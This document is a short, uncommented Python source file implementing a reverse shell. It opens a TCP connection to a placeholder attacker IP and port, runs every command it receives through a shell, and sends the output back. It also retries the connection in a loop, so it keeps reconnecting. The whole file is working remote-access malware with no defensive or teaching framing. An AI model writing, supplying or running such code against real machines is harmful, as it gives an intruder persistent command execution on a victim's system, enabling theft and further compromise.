import socket
import subprocess
import os
from time import sleep


IP = "XXX.XXX.X.XXX"
PORT = XXX


def connect (ip, port):
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((IP, PORT))
        return c
    except Exception as e:
        print(f'Connection Error: {e}')

def listen(c):
    try:
        while True:
            data = c.recv(1024).decode().strip()
            if data == "/exit":
                return
            else:
                cmd(c, data)

    except Exception as e:
        print(f'Listen function error: {e}')


def cmd(c, data):
    try:
        if data.startswith("cd "):
            os.chdir(data[3:].strip())
            return

        p = subprocess.Popen(
            data,
            shell=True,
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE
        )
        c.send(
            p.stdout.read() + p.stderr.read() + b"\n"
        )

    except Exception as e:
        print(f'CMD function error: {e}')

if __name__ == "__main__":
    try:
        while True:
            client = connect(IP, PORT)
            if client:
                listen(client)
            else:
                sleep(.5)

    except KeyboardInterrupt:
        print('Program stopped by the user!')

    except Exception as error:
        print(f'Main connection {error}')
